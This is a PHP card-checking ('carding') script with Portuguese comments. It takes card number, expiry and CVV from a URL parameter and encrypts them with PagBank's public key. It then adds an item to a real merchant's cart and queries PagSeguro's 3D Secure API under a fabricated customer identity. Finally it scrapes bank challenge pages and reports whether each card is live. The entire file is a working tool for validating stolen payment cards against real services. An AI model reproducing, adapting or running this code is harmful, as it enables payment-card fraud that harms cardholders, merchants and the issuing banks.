<?php
/*
===========================================
     CHECKER DE CARTÕES - VBV/3D SECURE
===========================================

COMO USAR:
- URL: http://seusite.com/vbv_pagpag.php?lista=NUMERO|MES|ANO|CVV
- Exemplos:
  ?lista=5122672221909912|02|2031|386
  ?lista=4111111111111111|12|2025|123
  ?lista=5555555555554444|01|2026|999

FUNCIONALIDADES:
✅ Detecta marca do cartão (Visa, Mastercard, etc)
✅ Identifica banco emissor pelo BIN
✅ Processa 3D Secure (VBV/SecureCode) 
✅ Analisa respostas dos bancos brasileiros
✅ Tratamento avançado de mensagens VBV
✅ Suporte a múltiplos padrões de resposta

RETORNOS POSSÍVEIS:
- Aprovada ↣ cartão válido e ativo
- Reprovada ↣ cartão inválido/sem limite/bloqueado

Credits: Encrypt function by @latrocini0
===========================================
*/

require_once 'vendor/autoload.php';
$CurlX = new CurlX();
$Tools = new CurlXTools($CurlX);
$cookie = new CookieJar('vbv');
$time = time();
$card = $Tools->parseCard($_GET['lista']);
if (!$card) {
    echo 'lista inválida!';
    exit;
}

$cc = $card['cc'];
$mes = $card['mes'];
$ano = $card['ano'];
$ano2 = $card['ano2'];
$cvv = $card['cvv'];
$brand = $card['brand'];
$lista = $card['full'];

// Detecta marca e banco do cartão
$detected_brand = detectCardBrand($cc);
$detected_bank = detectBankFromBin($cc);

// Log de informações do cartão (opcional)
$card_info = "[$detected_brand - $detected_bank]";

#$cpf = $Tools->generateCPF(true);
$email = $Tools->randomEmail();
#$CurlX->debug();


// Credits for the encrypt @latrocini0 thks :)

$PAGBANK_PUBLIC_KEY = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAohY3No2y7wJ3mmynx81tfeCnmd80k6c4ZiacJuLG7dP1JscTu0ivKXs5H+DClSKMIlKESm4XF4kUDvuFWqfz1c/NlzeGZ2ZA1EPByxLMyRDwxBT2aaxs6AB/VZ1NFJ2hiUrM96T86KljA/sPhGYqCAw5NAXMp4RhrYDrhw6b//DVzihiXxth/3UQC3FeRqcJhU7znwPTmkFqIjpFBUK7vTjqQ8eC/03vijL99/mn1ikLXogk4D109nO8wV3NAliW/9Ai3eslPKLH9dI/UgKlEh+qdnjo99hVr93Q3Mn4FX++tBh5UFA5q5fxV+8mSREG0aIq4Sgi6VcK0wKp6BkyqwIDAQAB';

function encryptCard($number, $month, $year, $cvv) {
    global $PAGBANK_PUBLIC_KEY;
    $pan = preg_replace('/\D/', '', $number);
    $month = str_pad($month, 2, '0', STR_PAD_LEFT);
    $year = strlen($year) == 2 ? '20' . $year : $year;
    $holder = "TITULAR DO CARTAO";
    $timestamp = round(microtime(true) * 1000);
    $payload = "$pan;$cvv;$month;$year;$holder;$timestamp";
    $lines = str_split($PAGBANK_PUBLIC_KEY, 64);
    $pem = "-----BEGIN PUBLIC KEY-----\n" . implode("\n", $lines) . "\n-----END PUBLIC KEY-----";
    $publicKey = openssl_pkey_get_public($pem);
    if (!$publicKey) {
        return null;
    }
    openssl_public_encrypt($payload, $encrypted, $publicKey, OPENSSL_PKCS1_PADDING);
    return base64_encode($encrypted);
}

function detectCardBrand($number) {
    $number = preg_replace('/\D/', '', $number);
    $patterns = [
        'visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'mastercard' => '/^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/',
        'amex' => '/^3[47][0-9]{13}$/',
        'discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'jcb' => '/^(?:2131|1800|35\d{3})\d{11}$/',
        'elo' => '/^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/',
        'hipercard' => '/^(606282\d{10}(\d{3})?)|(3841\d{15})$/',
        'aura' => '/^50[0-9]{14,17}$/'
    ];
    
    foreach ($patterns as $brand => $pattern) {
        if (preg_match($pattern, $number)) {
            return strtoupper($brand);
        }
    }
    return 'UNKNOWN';
}

function detectBankFromBin($bin) {
    $banks = [
        // Itaú
        '4011', '4012', '4013', '4014', '4515', '4516', '4517', '4518' => 'ITAU',
        // Bradesco
        '4551', '4902', '4903', '5555', '5556' => 'BRADESCO',
        // Santander
        '5448', '5449', '4001', '4002' => 'SANTANDER',
        // Banco do Brasil
        '4389', '4390', '5067', '5068' => 'BANCO_DO_BRASIL',
        // Caixa
        '4514', '5501', '5502' => 'CAIXA',
        // Nubank
        '5162', '5163' => 'NUBANK',
        // Sicredi
        '5122', '5123' => 'SICREDI',
        // BTG
        '5277', '5278' => 'BTG',
        // Inter
        '4444', '5566' => 'INTER',
        // C6 Bank
        '5225', '5226' => 'C6_BANK'
    ];
    
    $bin4 = substr($bin, 0, 4);
    foreach ($banks as $bins => $bank) {
        if (strpos($bins, $bin4) !== false) {
            return $bank;
        }
    }
    return 'UNKNOWN';
}

function clean_html($text) {
    if (!$text) return "";
    $text = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $text);
    $text = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $text);
    
    // Entidades HTML mais completas
    $replacements = [
        '&nbsp;' => ' ', '&amp;' => '&', '&lt;' => '<', '&gt;' => '>',
        '&quot;' => '"', '&apos;' => "'", '&hellip;' => '...',
        // Acentos portugueses
        '&aacute;' => 'á', '&Aacute;' => 'Á', '&agrave;' => 'à', '&Agrave;' => 'À',
        '&acirc;' => 'â', '&Acirc;' => 'Â', '&atilde;' => 'ã', '&Atilde;' => 'Ã',
        '&eacute;' => 'é', '&Eacute;' => 'É', '&egrave;' => 'è', '&Egrave;' => 'È',
        '&ecirc;' => 'ê', '&Ecirc;' => 'Ê', '&iacute;' => 'í', '&Iacute;' => 'Í',
        '&igrave;' => 'ì', '&Igrave;' => 'Ì', '&icirc;' => 'î', '&Icirc;' => 'Î',
        '&oacute;' => 'ó', '&Oacute;' => 'Ó', '&ograve;' => 'ò', '&Ograve;' => 'Ò',
        '&ocirc;' => 'ô', '&Ocirc;' => 'Ô', '&otilde;' => 'õ', '&Otilde;' => 'Õ',
        '&uacute;' => 'ú', '&Uacute;' => 'Ú', '&ugrave;' => 'ù', '&Ugrave;' => 'Ù',
        '&ucirc;' => 'û', '&Ucirc;' => 'Û', '&ccedil;' => 'ç', '&Ccedil;' => 'Ç',
        // Códigos numéricos
        '&#225;' => 'á', '&#224;' => 'à', '&#226;' => 'â', '&#227;' => 'ã',
        '&#233;' => 'é', '&#232;' => 'è', '&#234;' => 'ê', '&#237;' => 'í',
        '&#236;' => 'ì', '&#238;' => 'î', '&#243;' => 'ó', '&#242;' => 'ò',
        '&#244;' => 'ô', '&#245;' => 'õ', '&#250;' => 'ú', '&#249;' => 'ù',
        '&#251;' => 'û', '&#231;' => 'ç'
    ];
    
    $text = strtr($text, $replacements);
    $text = preg_replace('/<br\s*\/?>/i', "\n", $text);
    $text = preg_replace('/<[^>]*>/', ' ', $text);
    $text = preg_replace('/\s+/', ' ', $text);
    
    // Remove estabelecimentos específicos (se necessário)
    $text = preg_replace('/Estabelecimento:\s*Sandro Gonçalves de Jesus/i', '', $text);
    $text = preg_replace('/Estabelecimento:\s*FABIO DE MORAIS DANTAS/i', '', $text);
    
    return trim($text);
}

function extractBankFields($html) {
    // Padrões mais abrangentes para diferentes bancos
    $patterns = [
        // Mensagens gerais de 3D Secure
        '/<p[^>]*id="Body1"[^>]*>(.*?)<\/p>/is',
        '/<div class="challengeInfoText">(.*?)<\/div>/is',
        '/<div class="container_body_text">(.*?)<\/div>/is',
        '/<div id="info_message_auth">(.*?)<\/div>/is',
        
        // Itaú
        '/<div[^>]*class="[^"]*mensagem[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*class="[^"]*texto[^"]*"[^>]*>(.*?)<\/p>/is',
        '/id="textoMensagem"[^>]*>(.*?)<\/[^>]+>/is',
        
        // Bradesco
        '/<span[^>]*id="[^"]*mensagem[^"]*"[^>]*>(.*?)<\/span>/is',
        '/<div[^>]*class="[^"]*content[^"]*"[^>]*>(.*?)<\/div>/is',
        '/class="bradesco-message"[^>]*>(.*?)<\/[^>]+>/is',
        
        // Santander
        '/<div[^>]*class="[^"]*santander[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*id="[^"]*content[^"]*"[^>]*>(.*?)<\/p>/is',
        '/id="mainContent"[^>]*>(.*?)<\/[^>]+>/is',
        
        // Sicredi
        '/<div[^>]*class="[^"]*sicredi[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<span[^>]*class="[^"]*info[^"]*"[^>]*>(.*?)<\/span>/is',
        '/class="message-container"[^>]*>(.*?)<\/[^>]+>/is',
        
        // Nubank
        '/<div[^>]*class="[^"]*nu[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*class="[^"]*purple[^"]*"[^>]*>(.*?)<\/p>/is',
        
        // Banco do Brasil
        '/<div[^>]*class="[^"]*bb[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<span[^>]*id="[^"]*bb[^"]*"[^>]*>(.*?)<\/span>/is',
        
        // Caixa
        '/<div[^>]*class="[^"]*caixa[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<p[^>]*class="[^"]*azul[^"]*"[^>]*>(.*?)<\/p>/is',
        
        // Padrões genéricos de erro/sucesso
        '/<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*success[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*alert[^"]*"[^>]*>(.*?)<\/div>/is',
        '/<div[^>]*class="[^"]*warning[^"]*"[^>]*>(.*?)<\/div>/is',
        
        // Padrões de texto específicos
        '/(?:Nome|name):\s*([^<,\n]+)/i',
        '/(?:Para|To)\s+([^,<\n]+),/i',
        '/<div id="info_message_auth">.*?<p>\s*([^,]*),/s',
        '/<label[^>]*>(Chave titular Ref final \d+)<\/label>/i',
        '/<span[^>]*id=["\']contentBlock-text["\'][^>]*>(\+?\d+)<\/span>/i',
        
        // Mensagens de autenticação
        '/id="CredentialId-0a-label">(.*?)<\/label>/is',
        '/<label[^>]*for="[^"]*credential[^"]*"[^>]*>(.*?)<\/label>/is',
        
        // Captura qualquer texto em divs principais
        '/<div[^>]*id="[^"]*main[^"]*"[^>]*>.*?<\/div>/is',
        '/<div[^>]*class="[^"]*main[^"]*"[^>]*>.*?<\/div>/is',
        '/<body[^>]*>(.*?)<\/body>/is'
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $html, $match)) {
            $text = clean_html($match[1]);
            if (!empty($text) && strlen($text) > 3) {
                return $text;
            }
        }
    }
    
    // Fallback: tentar extrair qualquer texto visível
    $text = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $html);
    $text = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $html);
    $text = strip_tags($text);
    $text = preg_replace('/\s+/', ' ', $text);
    $text = trim($text);
    
    if (strlen($text) > 10) {
        return substr($text, 0, 200) . (strlen($text) > 200 ? '...' : '');
    }
    
    return "mensagem vbv não capturada";
}

function analyzeVbvMessage($message) {
    $message_lower = strtolower($message);
    
    // Palavras que indicam aprovação
    $approval_keywords = [
        'aprovada', 'sucesso', 'autorizada', 'confirmada', 'concluida',
        'success', 'approved', 'authorized', 'confirmed', 'completed',
        'para concluir', 'acesse seu aplicativo', 'confirme a transação',
        'transação autorizada', 'compra aprovada'
    ];
    
    // Palavras que indicam reprovação
    $decline_keywords = [
        'negada', 'recusada', 'reprovada', 'rejeitada', 'cancelada',
        'declined', 'denied', 'rejected', 'failed', 'error',
        'cartão inválido', 'dados incorretos', 'transação negada',
        'compra não autorizada', 'limite insuficiente', 'cartão bloqueado',
        'senha incorreta', 'falha na autenticação'
    ];
    
    // Verifica aprovação
    foreach ($approval_keywords as $keyword) {
        if (strpos($message_lower, $keyword) !== false) {
            return 'APPROVED';
        }
    }
    
    // Verifica reprovação
    foreach ($decline_keywords as $keyword) {
        if (strpos($message_lower, $keyword) !== false) {
            return 'DECLINED';
        }
    }
    
    return 'UNKNOWN';
}


$encrypted_hash = encryptCard($cc, $mes, $ano2, $cvv);

if (!$encrypted_hash) {
    echo "Reprovada ↣ $lista ↣ [Erro na criptografia] $card_info ↣ (" . (time() - $time) . "s)<br>";
    exit;
}

$add = $CurlX->get('https://conteudoemais.com.br/finalizar-compra/?add-to-cart=30157', [], $cookie);
#print_r($add->getHeaders());







$checkout = $CurlX->get('https://conteudoemais.com.br/finalizar-compra/', [], $cookie);
$ps_session = $checkout->between("var pagseguro_connect_3d_session = '", "'");

if (empty($ps_session)) {
    echo "Reprovada ↣ $lista ↣ [Erro ao capturar o session 3d] $card_info ↣ (" . (time() - $time) . "s)<br>";
    exit();
};

$headers = [
    'content-type: application/json',
    'authorization: ' . $ps_session
];

$post = '{"paymentMethod":{"type":"CREDIT_CARD","installments":1,"card":{"encrypted":"'.$encrypted_hash.'"}},"dataOnly":false,"customer":{"name":"Nocyam Solo","email":"geudgziwb@gmail.com","phones":[{"country":"55","area":"14","number":"998543793","type":"MOBILE"}]},"amount":{"value":999,"currency":"BRL"},"billingAddress":{"street":"Rua Conde de Baependi, 14","number":"n/d","complement":"n/d","regionCode":"SP","country":"BRA","city":"Rio de janeiro","postalCode":"22231140"},"deviceInformation":{"httpBrowserColorDepth":24,"httpBrowserJavaEnabled":false,"httpBrowserJavaScriptEnabled":true,"httpBrowserLanguage":"pt-BR","httpBrowserScreenHeight":412,"httpBrowserScreenWidth":915,"httpBrowserTimeDifference":180,"httpDeviceChannel":"Browser","userAgentBrowserValue":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"}}';


$auth_response = $CurlX->post('https://sdk.pagseguro.com/checkout-sdk/3ds/authentications', $post, $headers);
$data = $auth_response->json();
$three_ds_id = $data['id'] ?? '';


if (!$three_ds_id) {
    $status = $data['status'] ?? ($data['message'] ?? 'Falha na autenticação');
    echo "Reprovada ↣ $lista ↣ [$status] $card_info ↣ (" . (time() - $time) . "s)<br>";
    exit();
}


$confirm_response = $CurlX->post('https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/'.$three_ds_id, '', $headers);
$confirm_data = $confirm_response->json();
$tempo = time() - $time;

if (isset($confirm_data['status']) && $confirm_data['status'] === 'SUCCESS') {
    echo "Aprovada ↣ $lista ↣ transaction success $card_info ↣ ({$tempo}s)<br>";
} elseif (isset($confirm_data['status']) && $confirm_data['status'] === 'REQUIRE_CHALLENGE') {
    $challenge = $confirm_data['challenge'] ?? [];
    $acs_url = $challenge['acsUrl'] ?? '';
    $creq = $challenge['payload'] ?? '';

    if ($acs_url && $creq) {
        $challenge_response = $CurlX->post($acs_url, 'creq='.$creq);
        $message = extractBankFields($challenge_response->body);
        $analysis = analyzeVbvMessage($message);
        
        // Log detalhado (opcional - descomente se precisar)
        // error_log("VBV Response: " . $challenge_response->body);
        
        if ($analysis === 'DECLINED' || 
            strpos(strtolower($message), 'compra não concluída') !== false || 
            strpos(strtolower($message), 'reprovada') !== false || 
            strpos(strtolower($message), 'inválido') !== false) {
            echo "Reprovada ↣ $lista ↣ $message $card_info ↣ (" . (time() - $time) . "s)<br>";
        } else {
            echo "Aprovada ↣ $lista ↣ $message $card_info ↣ ({$tempo}s)<br>";
        }
    } else {
        echo "Reprovada ↣ $lista ↣ invalid challenger $card_info ↣ (" . (time() - $time) . "s)<br>";
    }
} else {
    $status = $confirm_data['status'] ?? 'DECLINED';
    $message = $confirm_data['message'] ?? '';
    if (!empty($message)) {
        echo "Reprovada ↣ $lista ↣ $message $card_info ↣ (" . (time() - $time) . "s)<br>";
    } else {
        echo "Reprovada ↣ $lista ↣ $status $card_info ↣ (" . (time() - $time) . "s)<br>";
    }
}


$cookie->delete();